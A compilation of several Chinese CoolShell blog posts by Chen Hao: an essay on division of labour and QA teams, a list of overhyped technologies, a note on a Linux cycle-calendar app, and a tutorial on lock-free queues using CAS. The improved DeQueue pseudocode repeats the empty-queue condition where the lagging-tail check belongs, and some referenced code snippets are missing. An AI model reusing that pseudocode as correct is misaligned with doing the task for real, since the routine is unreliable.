来自：酷壳网 CoolShell https://coolshell.cn!Division of Labour昨天，我看到一个新闻——雅虎取消了QA团队，工程师必须自己负责代码质量，并使用持续集成代替QA。 同时，也听到网友说，“听微软做数据库运维的工程师介绍，他们也是把运维工程师和测试工程师取消了，由开发全部完成。每个人都是全栈工程师”。于是，我顺势引用了几年前写过一篇文章《我们需要专职的QA吗？》，并且又鼓吹了一下全栈。当然，一如既往的得到了一些的争议和嘲弄;-)。有人认为取消QA基本上是公司没钱的象征，这个观点根本不值一驳，属于井底之蛙。有人认为，社会分工是大前提，并批评我说怎么不说把所有的事全干的，把我推向了另外一个极端。另外，你千万不要以为有了分工，QA的工作就保得住了。就像《乔布斯传》中乔布斯质疑财务制度的时候说的，有时候，很多人都不问为什么，觉得存在的东西都是理所应当的东西。让我们失去了独立思考的机会。分工也是一样。所以，为了说完整分工这个逻辑。请大家耐住性子，让我就先来谈谈“分工的优缺点”吧。目录* 分工的优点和缺点   * 全球化下的分工   * 分工的温床和天敌   * 什么样分工才是好的   * 小结
#### 分工的优点和缺点首先，分工（Division of Labour）应该是由 Adam Smith 在1776年的《国富论》中提出来的，Adam在那时候就观察到分工对于手工业生产效率的提高。他将效率提高的原因归结于三点：* 熟练程度的增加。当一个工人单纯地重复同一道工序时，其对这道工序的熟练程度会大幅增加。 **表现为产量和质量的提高** 。   * 如果没有分工，由一道工序转为另一道工序时会损失时间，而分工避免了这中间的损失。   * 由于对于工序的了解和熟练度的增加， **更有效率的机械和工具被发明出来，从而提高了产量** 。分工的确是提高生产力。我想到了福特公司一开始做出来的汽车几乎卖不出去，原因有两个，一个是成本太高，另外是生产太复杂，产能太低。于是福特公司开始把制造一辆汽车的工序分解开来，进行分工，分工给福特公司带来的好处是：1. 很多工作可以并行了，而且 **因为事情变得简单后，执行力也变强了**   2. 一个非常复杂和高深的汽车制造因为分工后， **很多工作不需要很NB的人来干了，只需要一般劳动者经过简单的培训就可以干了** 。而且，越干越熟练，越干越专业，最终可能让合适的人合适的事。   3. 分工后导致了很多重复劳动可以用技术来解决，于是福特公司出现生产流水线的技术（你是否还记得卓别林《摩登时代》里的工业生产流水线的场景，那取自福特公司）。
于是，福特公司的生产效率大大提高，最终实现了让每个美国家庭都能买得起汽车的理想，同时让美国成为了轮子上的国家。不过，我们需要注意的是，在《国富论》中，Adam他同时也提到，分工如果过细，同样会带来问题—— **简单重复的劳动会让人变成一个不会思考的机器，从而越来越笨，进而变成平庸的无技能的人** 。自“分工”出现以后，争论就没有停止过。Karl Max同样认为 **分工越来越细，会导致人的技术越来越差，同时，大量的重复劳动也会导致人对工作的失出热情，产生厌倦和抵触心理，最终会导致生产力的下降** 。同时，还有一些经济学家也同样表明分工的一些缺点：* **导致人只关注整个事情中的一小块，缺乏全局视角，导致视野受限，没有完全领会工作的意义和目标，从而导致各种返工** 。* **对于组织而言，分工也会导致出现大量的沟通协同成本，并出现碎片的生产方式，以及组织的孤岛形式，并不利于提高生产力** 。当然，奥地利经济学家Ludwig von Mises 并不这么认为，他认为，在分工所得到的好处面前，这些副作用不算什么。并且，他认为在资本主义的制度下，完全是可以平衡分工的各种优点和各种缺点，从而可以达到提高生产力和提高人员素质的双赢解的。
比如说， **分工中的各种沟通问题是可以通过一个标准协议来解的** ，造灯泡的，造开关的，造灯座的完全不知道对方的存在，他们只所以可以让做出来的东西拼在一起，完全是通过了一种标准协议完成的。 **这也是为什么这个世界上有各种各样的标准化的组织** 。还有很多经济学家对分工都有自己的见解和想法。不过基本上就是上面这些Pros和Cons了。下图是一个PPT的两个slids，可以点击看大图（来源）!lecture-5-10-728 | !lecture-5-11-728   ---|---#### 全球化下的分工分工带来问题在全球化的浪潮下变得尤为突出。其委婉地被讲成是比较优势（Comparative Advantage）**比较优势（** 又叫 **相对优势** ）是经济学的概念，解释了为何在拥有相对的机会成本的优势下生产，贸易对双方都有利。当一方（一个人，一间公司，或一国）进行一项生产时所付出的机会成本比另一方低，这一方面拥有了进行这项生产的比较优势。于是，一个国家倘若专门生产自己相对优势较大的产品，并通过国际贸易换取自己不具有相对优势的产品就能获得利益。于是乎，分工本来想要的是——合适的人干合适的事， **但是在比较优势的情况下，商业社会把分工变成了** —— **不是选择合适的人、公司或国家，而是选择成本低的人、公司或国家** 。
经济合作与发展组织OECD最近（2015年6月28日）对全球化这样建议的——> > “有效率的政策的本质不是阻止失业而是鼓励就业，如果各个国家都在收获全球化的利益而不是开放贸易的话，那么一些地方就会失去工作机会，当然也伴随着在另一些地方出现新的工作机会，这是全球化进程不可避免的，而我们面对的挑战是怎么能流畅调整我们的流程，能为那些新出现的工作机会找到合适的技能匹配的工人”。通过上面的说明，我想你可以知道，为什么中国成为了世界劳动力大国，而为什么当初美国科技公司进入中国的时候，首先把测试的工作放到了中国。这就是所谓的全球化分工。同时我们也可以看到，像我们中国这样技术能力的确非常不足的国家，的确是可以通过分工这种形式，让我们这些技能一般的技术人员参与一个复杂的有技术含量的项目当中。这其中就是分工的光明面和阴暗面。那么，我们想一想， **随着中国的人力成本的越来越大，国际化的分工因为商业资本的因素，必然不会选择中国，只会选择人力成本更低的国家，比如印度、越南、甚至人力成本更低的国家** 。美国雅虎和Adobe不是离开中国了么？再看看中国因为人民币的汇率或是人力成本的上升，我们在早几年关了多少个Made in China的工厂，这就是全球化的分工，商业上来说，他不是找最合适的人，而是找成本最低的人。
所以， **你千万不要以为我一提倡全栈了，你QA的工作就保不住了，就算没有全栈，就算是你还在坚持的社会化的分工，也可能让你的QA的工作就保不住了，除非，你能提供更低的价格** 。（想想这其中的逻辑吧，人家美国人把一些技术工作（比如测试）外包到中国的原因不是因为中国人聪明，想得周全，适合干这个测试这个事，而是因为中国人廉价，所以，当中国不在廉价了，自然就会找更廉价的地方了）为什么国家要从Made in China转型？不就是因为中国早期拿到的国际化分工就是这些没有技术含量的支持性的分工么？也因此而造就了大量的技能很一般的工人。为了能在全球化分工中能拿到更有质量的工作， **我们必然要从劳动密集型转向成知识密集型，必然要从支持性的工作转变为产出性的工作，必然需要单一技能型的技工转变为复合型的人才** 。#### 分工的温床和天敌**分工的温床主要有两个** ，* **一个是成本和效率** ，资本家或企业主或一个国家为了追求更快成本更底的生产方式，他们必然会进行大规模的分工，伴随着分工，他们也会把一些知识或技术密集型的工作生生地变成劳动密集型的工作。然后层层外包。* **一个是组织的大小** ，当一个组织的人数不断的变大，那么，你只能把工作和任务分得更细。这是被人数逼的，而不是实际需要的。这就是为什么我们可以看到很多大公司里要么人浮于事，要么瞎忙。
**分工的天敌主要有一个——那就是技术** ！每当新技术出现的时候，一些复杂的工序会被一台机器或是一种高超的技术所取代，不管是被技术自动化，还是被技术所简化 **，** 总之，以前本来需要数十人或是数百人才能干的事，突然之间只需要一个人就可以干完了。生产力得到了巨大的释放。所以，你这就是我们常听的—— **科技是第一生产力！**说到这里，让我们再来看看雅虎的那条新闻——> 在软件开发流程中去掉QA团队会发生什么？更少的代码错误，更快的开发周期。这是雅虎工程师过去一年的实验结果。 **雅虎的Warp > Drive计划将程序开发从批发布转移了持续交付模式** ，工程师的代码不经过QA团队的人工检查而是直接发布。 > **开发模式的转变导致了处理问题理念的根本性改变，迫使工程师开发自动检查工具去识别原来由人工检查发现的错误** > 。雅虎的技术团队现在全部是工程师，而不再有QA团队容身之处。雅虎的首席架构师 Amotz > Maimon说，他们本来预计可能会发生严重问题，结果出乎意料，每个曾经对此抱有怀疑态度的人都说新做法很有效。所以， **当你面对一些难题的时候，比如线上的故障，或是一个复杂的软件生产活动，你是要加更多的流程更多的人呢，还是要用技术解决问题呢？一边是温床，一边是天敌，你想好了吗？**
#### 什么样分工才是好的分工是必然的，因为很简单，你不可能一个人干完所有的事情，所以必需要分工， **分工不是问题，而问题则变成了——什么样的分工是理想的，是优雅的，是有效率的？**!华君武漫画《科学分工？》**华君武漫画《科学分工？》**对于分工来说，一般来是一种组织和管理形为。就目前来说，现代的公司有两种分工模式，分别是 **Control** 和 **Commitment** 这两种分工。* **Control就是控制型的管理，它是一种是基于工作技能的分工，于是员工会被这种分工分配到一个比较窄的技能里去完成一个非常明确的工作** 。* **而Commitment则是面向员工的责任心和所承担的目标来分工并完成工作的。相比起前者来说，这样的分工在完成工作时，需要的不仅仅是技能，还需要更多的责任感** 。这么说吧，* 对于基于工作技能的分工，你会看到，这样的公司会把技术人员按编程语言来分，比如：Java、PHP、C/C++，或是分成：Web端、iOS端、Android端、后端、算法、数据。或是分成：开发，测试，运维。* 对于基于Commitment的分工，你会看到他们这样分的，软件工程师（不分前后端，不分语言，不分运维，测试），因为这样的公司认为，他招的不是只有特定语言技能的Coder，而是而学多种语言多种技术能保证软件质量以及能对软件维护的软件工程师。这种公司的软件工程师是各种团队都可以去的，而他们的分工更多的是按软件的功能，软件的模块，或是软件的产品线来分工。
基于技能的分工已是过去时，而基于 Commitment 的分工是更有效率的分工的未来。你可以参看McAlister-Kizzier, Donna. 的文献 “Division of Labor.” 。#### 小结我说了这么多，不知道你看懂了我想表达什么没有？我不强加我的价值观，只希望你自己问自己几个问题：1）作为工作的人，在分工中你会怎样选择？是成为一颗棋子，一颗螺丝钉，还是成为一个多面手？2）作为工作的人，当你选择工作或任务的时候，你是选择做支持性的工作，还是做产出性的工作？你是选择做劳动密集型重复工作，还是做知识密集型的创新性的工作？3）作为老板，你是想要什么样的员工？听话的只会加班和干重复工作的劳动力，还是有责任心的为企业和产品负责的员工？4）作为老板，你是想通过分工释放低端员工的生产力，还是通过科技或技术去创造更NB的生产力？5）作为老板，分工中的问题，你找到比较优的解了吗？比如，对于不同团队间的协议，你找到了吗？可能，在不同的情况下你会有不同的答案。但是对我来说呢，无论是什么情况，我都只会有一个答案。（全文完）# 那些炒作过度的技术和概念作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn
StackExchange.com上有一个贴子在评论着最近20年来被炒作过度的技术，对于出现的结果，大多数赞同，也有一些不赞同。下面我从前15名挑了10个（Java的WORE我去掉了，TDD我也去掉了，因为我觉得他们应该没有炒作过度，而且都不错），按原贴的顺序罗列如下：（后面的一些评论是我加的，欢迎大家讨论）#### Top 10 过度炒作的技术和概念* **Unified Modeling Language (UML)** – UML是一个程序员交流想法的不错的工具，但是他离程序员真正需要的设计工具还差得很远，比如：设计是否符合需求、架构设计、数据流等等。只有为数不多的程序员使用这个工具交流想法，而没有用在具体工作中。* **Sharepoint** – 现在N多的公司都在用微软的这个东西做公司内部的Intranet。不过安装和维护起来，代价相当的大。但是其市场做的很成功，不对技术上来说对技术人员来说，相当的蹩脚。Sharepoint的设计没有认真地分析过业务流程，仅仅是一个文档存储地。看上去我们似乎可以做任何的事，但是如果你要用其来管理你的项目和track你的项目问题，你会发现其是无比的难用。
* **eXtensible Mark-up Language (XML)** – XML嘛，以前说过很多了（XML1， XML2）我们用他来做和程序数据封装，用来做配置文件，用来做网络传输格式。我们的程序处理起XML来，又慢，又不经济，没有工具，几乎无法维护XML文件。XML用来做数据封包真是很不经济，Yaml和JSON那个不比它简单？用XML来做程序配置文件不知道是谁想出来的主意，相当的愚蠢，看看Unix/Linux下的配置文件，简单易读，相当容易维护。真是高科技啊。* **SOAP, XML-RPC, WSDL 的 Web Services** – 这个东西前几年炒的很凶。所有人都相信，这是程序员的未来。可惜的，其中的复杂和不一致，相当的令人恶心。SOAP的那个S居然还是Simple！看来，扯上XML的都不会是什么好的东东。不过，个人认为，CORBA比他更恶。* **CORBA** – 作为一个比其更恶的更过度炒作的COM技术的Linux/Unix下的补充技术，这个技术也好不到哪里去。相当的复杂，从理论上开始就是这样了。这是一个没有经过实践就搞出来的一个东西。然后开始炒作。* **Cloud Computing** – 这是一个靠炒作出现的东西。这个东西也就是说，我们可以使用不同的调备，比如电脑，平板电脑，手机，移动设备随时随地做想做的事。Google的Chrome笔记本的广告展示了这项技术，但是，把工作结果放在云端的人会有多少呢。更多的人更喜欢的是去使用那些自己可以控制的电脑或平台。Google在这点上做的明显不如Amazon，像Amazon EC2平台，你可以在世界上任何一个角落随时随地的去启动你那台远程的系统。（ ** _更新（2011/1/29）_** ：解释一下，关于云计算，在写下这篇文章的时候我本来有点拿不定主意的，后来回顾了一下历史，如COM啊，ActiveX啊，EJB啊，当时感觉都是很强的东西，但是最终也只是被炒作的。云计算，我不知道未来怎么样，从今天来看，这项技术在今天存在炒作的情况——中移动云，阿里云，到处都是云，在云面前，神马都是浮云了。）
* **SOA – Service Oriented Architecture** – 这是一个没有人真正知道是什么玩意的概念。炒作了很多年，很多人都试图去了解它，但最后的结果是打个哈欠，看别的东西去了。现在没有人提了。中国一些银行在IBM的鼓动下搞了很多所谓的SOA应用，结果是系统很复杂，当然，也再离不开IBM了。* **Software Industrial Process** – 软件开发中有很多所谓的工业界的流程，用这些流程好像可以控制质量。外包公司和中国的本土公司很喜欢这些东西，比如ISO和CMMi，这些流程不能说不好，也有好的地方，尤其是对那些不会思考只要跟从的Worker来说。这些工业界流程中炒作过度的是，那些所谓的使用这些流程可以预测项目周期，质量控制，以前需求开发和管理等东西。其让流程上升到了一种神学的可预言的地步，同样也上升到了政治的地步。因为，这些流程中都必然会有SQA 的Audit的流程，还有统计和报告的流程，这些统统不是软件开发的流程，但是的确是相当的政治。使用这些工业届标准流程的公司，通常都是一些创造性有问题的公司。* **Agile Software Development – 敏捷开发** 。首先，我承认其中的很多实践相当有效，在理论上也不错，还有很多不错方法的。不过，还是有炒作的成分（ **下面的言论，我等着被骂** ）对我来说，在中国，“敏捷开发”的炒作简直就像是一个电视购物，ThoughtWorks中国各种咨询师们软件开发经验其实并不丰富，准确来说，他们有的是咨询经验，而没有具体项目实施经验（有的咨询师甚至都没有写过一行代码就去学教人怎么编程和开发软件了），和他们沟通起来能够感到他们对敏捷很亢奋，而且是唯敏捷主义，就差打出Once Process，One Agile的口号了，他们信仰敏捷流程的已经接近宗教信仰，他们的精神世界很朝鲜。因为，无论你和他们的咨询师谈什么，他们只说敏捷，从来不会分析一下，项目的特性是什么？开发这个项目的人的风格是什么？客户的特性是什么？有没有关心软件的stakeholder们（如：程序员，测试人员，客户，管理人员）是怎么想的？而XP和SCRUM也就成了Push工程师最强大的工具。 **流程这个东西，应该是项目组自发出来的东西，而不是被 灌输，被教条使用的东西。不同的团队、不同的项目、不同的人，不同的风格就是不同的流程，只有去使用适合自己的流程才是最好的流程** 。 **打个比方，足球队中，巴西队玩的是个人艺术足球，德国队玩的是整体和纪律性足球，意大利玩的是防守型足球，但是他们都有夺世界杯冠军的实力，如果你硬要让巴西队去整德国队或是意大利队的风格，那就悲剧了** 。很显然，ThoughtWorks很像把全中国的软件公司都整成Agile的，这注定了其在中国是杯具的，也只能争取到那些不知所措的公司和项目，没有合适的项目，也只有靠各种炒作（比如整一些大会，搞一些宣传）。他们总是觉得中国的用户和程序员需要去用时间不停地教育，但是，他们从来没有想想自己的原因 — 靠教育和灌输是永远赢不了的。 **我给他们的个人建议是，不要以为世界就像你所想像的那样，学会尊重程序员和项目还有很多非技术的东西，多听听程序员和客户怎么说，多分析一下项目的特质，从实际情况出发，而不是自己涛涛不绝地 **向大家** 灌输自己的理论**。
* **Object-Oriented Programming (OOP** ) – 不多说了，以前本站说过了，所有的一切都在面向对象是个骗局一文中。不过有一点我想告诉大家，面向对象的Design Pattern真是被滥用了，Design Pattern教你的是两件事，1）怎么去化繁为简，2）怎么能让对象的耦合性降低。而不是一个公式让你的套，但，更多的程序员则学会了“流行的设计模式编程”。#### 附：下构面是我拿不定是否是过度炒作的技术**Write Once Run Anywhere** – 这个有点让我不解，不知道为什么会那么靠前。这是Java的口号，我觉得Java在跨平台方面还是成功的，没有过度炒作啊。用虚拟机的确是做到了这一点，对于那些需要有不同的硬件和操作系统平台并不断升级和更换它们的公司来说，这的确是个很不错的解决平台依赖性的方案。我个感觉这个技术并没有炒作过头，至少在Java这边是这样的。与其说这个，还不如说EJB，这才是炒作过度的技术。[更新 2011/02/13]下面的回复，在我形成这篇文章的时候我没有想过，经ming同学一说，我觉得似乎有些道理。> **ming :** > > 我从一开始就觉得java的“Write Once Run Anywhere”是彻头彻尾的炒作。 > > > 想想，所谓的跨平台无非就是依靠虚拟机、解释器之类的东西实现的，那么，哪个脚本语言不是依靠解释器呢？古老的perl已经跨平台了。当然，跨平台的语言还有很多。但是，只有java炒作这个概念。
**Test Driven Design (TDD)** – 从测试案例开始写程序这可能是很多程序员都不习惯的方法。其实这是一种比较好的编程方法，保证了代码怎么改动都不会break其它没有改动的代码，代码可以在一种持续集成中保证质量。但是，我们需要知道TDD的一些副作用（在十条不错的编程观点里也提到过TDD的弊端）：1）TDD可能会让程序员敷衍了事，以为test case 没有错就正确了。2）TDD可能会让你忽略了软件设计和架构以及程序的扩展性和重用性。T **DD只是一种方法，并不是程序的核心** 。当然，TDD近几年的炒作也有点过头，已经出现了“TDD是一种Design方法”等“神乎其技”的论调，我对此表示质疑中。[更新 2011/02/13] 关于TDD，请参看我另一篇文章《TDD并不是看上去的那么美》（全文完）*[W3C]: World Wide Web Consortium   *[VML]: Vector Markup Language# Linux的cycle日历（你懂的）作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn这是一个开源项目：，其是用python写的。在项目的主页上说，这是一个给妇女用的日历程序，叫cycle，周期，给妇女的，我不多说了，你懂的。下面是一些介绍（请大家注意学习相关的英文单词）
当然，这个小程序不单单只是查看妇女的“周期”（menstruation），其还提供了以下的功能：* 第一次的周期 – 在日历上显示为粉色。menstruation周期长度由用户输入的六次周期取平均值确定。   * 排卵期（Ovulation day）- 在日历上显示为亮绿色，   * 受精期 （Fertile period）- 在日历上显示为绿色   * 安全期（Safe Sex）   * 预产期（Date of birth）   * 还允许你记一些notes – 医生建议你服用一些荷尔蒙避孕药（hormonal contraceptive）下面是屏幕截图 ——!Screenshoot注意以下的免责条款：* 本程序并不能成为一种避孕的方法。   * 本程序也不能阻止各种性传染病，如：AIDS   * 本程序更不能取代你的妇科医生。（全文完）# 无锁队列的实现作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn**_————注：本文于2019年11月4日更新————_**关于无锁队列的实现，网上有很多文章，虽然本文可能和那些文章有所重复，但是我还是想以我自己的方式把这些文章中的重要的知识点串起来和大家讲一讲这个技术。下面开始正文。
目录* 关于CAS等原子操作   * 无锁队列的链表实现   * CAS的ABA问题   * 解决ABA的问题   * 用数组实现无锁队列   * 小结#### 关于CAS等原子操作在开始说无锁队列之前，我们需要知道一个很重要的技术就是CAS操作——Compare & Set，或是 Compare & Swap， **现在几乎所有的CPU指令都支持CAS的原子操作，X86下对应的是 CMPXCHG 汇编指令。**有了这个原子操作，我们就可以用其来实现各种无锁（lock free）的数据结构。这个操作用C语言来描述就是下面这个样子：（代码来自Wikipedia的Compare And Swap词条）意思就是说，看一看内存`*reg`里的值是不是`oldval`，如果是的话，则对其赋值`newval`。我们可以看到，`old_reg_val` 总是返回，于是，我们可以在 `compare_and_swap` 操作之后对其进行测试，以查看它是否与 `oldval`相匹配，因为它可能有所不同，这意味着另一个并发线程已成功地竞争到 `compare_and_swap` 并成功将 `reg` 值从 `oldval` 更改为别的值了。
这个操作可以变种为返回bool值的形式（返回 bool值的好处在于，可以调用者知道有没有更新成功）：与CAS相似的还有下面的原子操作：（这些东西大家自己看Wikipedia，也没什么复杂的）* Fetch And Add，一般用来对变量做 +1 的原子操作   * Test-and-set，写值到某个内存位置并传回其旧值。汇编指令BST   * Test and Test-and-set，用来低低Test-and-Set的资源争夺情况**注：** 在实际的C/C++程序中，CAS的各种实现版本如下：**1）GCC的CAS**GCC4.1+版本中支持CAS的原子操作（完整的原子操作可参看 GCC Atomic Builtins）bool __sync_bool_compare_and_swap (type *ptr, type oldval type newval, ...)     type __sync_val_compare_and_swap (type *ptr, type oldval type newval, ...)**2）Windows的CAS**在Windows下，你可以使用下面的Windows API来完成CAS：（完整的Windows原子操作可参看MSDN的InterLocked Functions.aspx#interlocked_functions)）
InterlockedCompareExchange ( __inout LONG volatile *Target,     __in LONG Exchange,     __in LONG Comperand);**3) C++11中的CAS**C++11中的STL中的atomic类的函数可以让你跨平台。（完整的C++11的原子操作可参看 Atomic Operation Library）template< class T >     bool atomic_compare_exchange_weak( std::atomic* obj,     T* expected, T desired );     template< class T >     bool atomic_compare_exchange_weak( volatile std::atomic* obj,     T* expected, T desired );#### 无锁队列的链表实现下面的代码主要参考于两篇论文：* John D. Valois 1994年10月在拉斯维加斯的并行和分布系统系统国际大会上的一篇论文——《Implementing Lock-Free Queues》   * 美国纽约罗切斯特大学 Maged M. Michael 和 Michael L. Scott 在1996年3月发表的一篇论文 《Simple, Fast, and Practical Non-Blocking and Blocking ConcurrentQueue Algorithms》
（注：下面的代码并不完全与这篇论文相同）初始化一个队列的代码很简，初始化一个dummy结点（注：在链表操作中，使用一个dummy结点，可以少掉很多边界条件的判断），如下所示：我们先来看一下进队列用CAS实现的方式，基本上来说就是链表的两步操作：1. 第一步，把tail指针的next指向要加入的结点。 `tail->next = p;`   2. 第二步，把tail指针移到队尾。 `tail = p;`EnQueue(Q, data) //进队列     {     //准备新加入的结点数据     n = new node();     n->value = data;     n->next = NULL;do {     p = Q->tail; //取链表尾指针的快照     } while( CAS(p->next, NULL, n) != TRUE);     //while条件注释：如果没有把结点链在尾指针上，再试CAS(Q->tail, p, n); //置尾结点 tail = n;     }我们可以看到，程序中的那个 do-while 的 Retry-Loop 中的 CAS 操作：如果 `p->next` 是 `NULL`，那么，把新结点 `n` 加到队尾。如果不成功，则重新再来一次！
就是说，很有可能我在准备在队列尾加入结点时，别的线程已经加成功了，于是tail指针就变了，于是我的CAS返回了false，于是程序再试，直到试成功为止。这个很像我们的抢电话热线的不停重播的情况。但是你会看到，为什么我们的“置尾结点”的操作（第13行）不判断是否成功，因为：1. 如果有一个线程T1，它的while中的CAS如果成功的话，那么其它所有的 随后线程的CAS都会失败，然后就会再循环，   2. 此时，如果T1 线程还没有更新tail指针，其它的线程继续失败，因为`tail->next`不是NULL了。   3. 直到T1线程更新完 `tail` 指针，于是其它的线程中的某个线程就可以得到新的 `tail` 指针，继续往下走了。   4. 所以，只要线程能从 while 循环中退出来，意味着，它已经“独占”了，`tail` 指针必然可以被更新。这里有一个潜在的问题—— **如果T1线程在用CAS更新tail指针的之前，线程停掉或是挂掉了，那么其它线程就进入死循环了** 。下面是改良版的EnQueue()EnQueue(Q, data) //进队列改良版 v1     {     n = new node();     n->value = data;     n->next = NULL;
p = Q->tail;     oldp = p     do {     while (p->next != NULL)     p = p->next;     } while( CAS(p.next, NULL, n) != TRUE); //如果没有把结点链在尾上，再试CAS(Q->tail, oldp, n); //置尾结点     }我们让每个线程，自己fetch 指针 `p` 到链表尾。但是这样的fetch会很影响性能。而且，如果一个线程不断的EnQueue，会导致所有的其它线程都去 fetch 他们的 `p` 指针到队尾，能不能不要所有的线程都干同一个事？这样可以节省整体的时间？比如：直接 fetch `Q->tail` 到队尾？因为，所有的线程都共享着 Q->tail，所以，一旦有人动了它后，相当于其它的线程也跟着动了，于是，我们的代码可以改进成如下的实现：EnQueue(Q, data) //进队列改良版 v2     {     n = new node();     n->value = data;     n->next = NULL;while(TRUE) {     //先取一下尾指针和尾指针的next     tail = Q->tail;     next = tail->next;
//如果尾指针已经被移动了，则重新开始     if ( tail != Q->tail ) continue;//如果尾指针的 next 不为NULL，则 fetch 全局尾指针到next     if ( next != NULL ) {     CAS(Q->tail, tail, next);     continue;     }//如果加入结点成功，则退出     if ( CAS(tail->next, next, n) == TRUE ) break;     }     CAS(Q->tail, tail, n); //置尾结点     }上述的代码还是很清楚的，相信你一定能看懂，而且，这也是 Java 中的 `ConcurrentLinkedQueue` 的实现逻辑，当然，我上面的这个版本比 Java 的好一点，因为没有 if 嵌套，嘿嘿。好了，我们解决了EnQueue，我们再来看看DeQueue的代码：（很简单，我就不解释了）DeQueue(Q) //出队列     {     do{     p = Q->head;     if (p->next == NULL){     return ERR_EMPTY_QUEUE;     }     while( CAS(Q->head, p, p->next) != TRUE );     return p->next->value;     }
**我们可以看到，DeQueue的代码操作的是`head->next`，而不是 `head` 本身。这样考虑是因为一个边界条件，我们需要一个dummy的头指针来解决链表中如果只有一个元素，`head` 和 `tail` 都指向同一个结点的问题，这样 `EnQueue` 和 `DeQueue` 要互相排斥了**。但是，如果 `head` 和 `tail` 都指向同一个结点，这意味着队列为空，应该返回 `ERR_EMPTY_QUEUE`，但是，在判断 `p->next == NULL` 时，另外一个EnQueue操作做了一半，此时的 p->next 不为 NULL了，但是 tail 指针还差最后一步，没有更新到新加的结点，这个时候就会出现，在 EnQueue 并没有完成的时候， DeQueue 已经把新增加的结点给取走了，此时，队列为空，但是，head 与 tail 并没有指向同一个结点。如下所示：虽然，EnQueue的函数会把 tail 指针置对，但是，这种情况可能还是会导致一些并发问题，所以，严谨来说，我们需要避免这种情况。于是，我们需要加入更多的判断条件，还确保这个问题。下面是相关的改进代码：
DeQueue(Q) //出队列，改进版     {     while(TRUE) {     //取出头指针，尾指针，和第一个元素的指针     head = Q->head;     tail = Q->tail;     next = head->next;// Q->head 指针已移动，重新取 head指针     if ( head != Q->head ) continue;// 如果是空队列     if ( head == tail && next == NULL ) {     return ERR_EMPTY_QUEUE;     }//如果 tail 指针落后了     if ( head == tail && next == NULL ) {     CAS(Q->tail, tail, next);     continue;     }//移动 head 指针成功后，取出数据     if ( CAS( Q->head, head, next) == TRUE){     value = next->value;     break;     }     }     free(head); //释放老的dummy结点     return value;     }
上面这段代码的逻辑和 Java 的 `ConcurrentLinkedQueue` 的 `poll` 方法很一致了。也是《Simple, Fast, and Practical Non-Blocking and Blocking ConcurrentQueue Algorithms》这篇论文中的实现。#### CAS的ABA问题所谓ABA（见维基百科的ABA词条），问题基本是这个样子：1. 进程P1在共享变量中读到值为A   2. P1被抢占了，进程P2执行   3. P2把共享变量里的值从A改成了B，再改回到A，此时被P1抢占。   4. P1回来看到共享变量里的值没有被改变，于是继续执行。虽然P1以为变量值没有改变，继续执行了，但是这个会引发一些潜在的问题。 **ABA问题最容易发生在lock free 的算法中的，CAS首当其冲，因为CAS判断的是指针的值。很明显，值是很容易又变成原样的。**比如上述的DeQueue()函数，因为我们要让head和tail分开，所以我们引入了一个dummy指针给head，当我们做CAS的之前，如果head的那块内存被回收并被重用了，而重用的内存又被EnQueue()进来了，这会有很大的问题。（ **内存管理中重用内存基本上是一种很常见的行为** ）
这个例子你可能没有看懂，维基百科上给了一个活生生的例子——> > 你拿着一个装满钱的手提箱在飞机场，此时过来了一个火辣性感的美女，然后她很暖昧地挑逗着你，并趁你不注意的时候，把用一个一模一样的手提箱和你那装满钱的箱子调了个包，然后就离开了，你看到你的手提箱还在那，于是就提着手提箱去赶飞机去了。这就是ABA的问题。#### 解决ABA的问题维基百科上给了一个解——使用double-CAS（双保险的CAS），例如，在32位系统上，我们要检查64位的内容1）一次用CAS检查双倍长度的值，前半部是值，后半部分是一个计数器。2）只有这两个都一样，才算通过检查，要吧赋新的值。并把计数器累加1。这样一来，ABA发生时，虽然值一样，但是计数器就不一样（但是在32位的系统上，这个计数器会溢出回来又从1开始的，这还是会有ABA的问题）当然，我们这个队列的问题就是不想让那个内存重用，这样明确的业务问题比较好解决，论文《Implementing Lock-Free Queues》给出一这么一个方法—— **使用结点内存引用计数refcnt** ！（论文《Simple, Fast, and Practical Non-Blocking and Blocking ConcurrentQueue Algorithms》中的实现方法也基本上是一样的，用到的是增加一个计数，可以理解为版本号）
）Fetch&Add(p->refcnt, 1);其中的 Fetch&Add和Release分是是加引用计数和减引用计数，都是原子操作，这样就可以阻止内存被回收了。#### 用数组实现无锁队列本实现来自论文《Implementing Lock-Free Queues》使用数组来实现队列是很常见的方法，因为没有内存的分部和释放，一切都会变得简单，实现的思路如下：1）数组队列应该是一个ring buffer形式的数组（环形数组）2）数组的元素应该有三个可能的值：HEAD，TAIL，EMPTY（当然，还有实际的数据）3）数组一开始全部初始化成EMPTY，有两个相邻的元素要初始化成HEAD和TAIL，这代表空队列。4）EnQueue操作。假设数据x要入队列，定位TAIL的位置，使用double-CAS方法把(TAIL, EMPTY) 更新成 (x, TAIL)。需要注意，如果找不到(TAIL, EMPTY)，则说明队列满了。5）DeQueue操作。定位HEAD的位置，把(HEAD, x)更新成(EMPTY, HEAD)，并把x返回。同样需要注意，如果x是TAIL，则说明队列为空。算法的一个关键是——如何定位HEAD或TAIL？
1）我们可以声明两个计数器，一个用来计数EnQueue的次数，一个用来计数DeQueue的次数。2）这两个计算器使用使用Fetch&ADD来进行原子累加，在EnQueue或DeQueue完成的时候累加就好了。3）累加后求个模什么的就可以知道TAIL和HEAD的位置了。如下图所示：####  小结以上基本上就是所有的无锁队列的技术细节，这些技术都可以用在其它的无锁数据结构上。1）无锁队列主要是通过CAS、FAA这些原子操作，和Retry-Loop实现。2）对于Retry-Loop，我个人感觉其实和锁什么什么两样。只是这种“锁”的粒度变小了，主要是“锁”HEAD和TAIL这两个关键资源。而不是整个数据结构。还有一些和Lock Free的文章你可以去看看：* Code Project 上的雄文 《Yet another implementation of a lock-free circular array queue》   * Herb Sutter的《Writing Lock-Free Code: A Corrected Queue》– 用C++11的std::atomic模板。   * IBM developerWorks的《设计不使用互斥锁的并发数据结构》
